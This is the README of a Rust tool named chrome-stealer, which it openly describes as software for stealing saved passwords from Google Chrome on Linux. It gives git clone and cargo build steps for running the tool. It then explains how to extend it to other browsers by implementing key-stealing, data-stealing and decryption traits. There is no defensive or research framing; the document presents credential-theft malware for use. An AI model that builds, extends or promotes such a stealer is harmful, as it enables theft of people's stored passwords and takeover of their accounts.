# About
Software for stealing saved passwords from Google Chrome browser implemented in Rust.
Currently only Linux OS is supported.

# Install
You can build it from sources using `cargo` tool:
```
git clone --depth 1 https://github.com/astronmax/chrome-stealer
cd chrome-stealer
cargo build -r
cd target/release
./chrome-stealer
```

# Development
To create new stealer for some browser you need to implement 3 structures for traits:
- **KeyStealer**  - stealing key for decryption
- **DataStealer** - stealing data from local database
- **Decryptor**   - decrypt stealed password using stealed key 

Then you can create your **Stealer** and choose `key_stealer`, `data_stealer` and `decryptor` for it.  
And you doesn't need to change main `steal()` algorithm.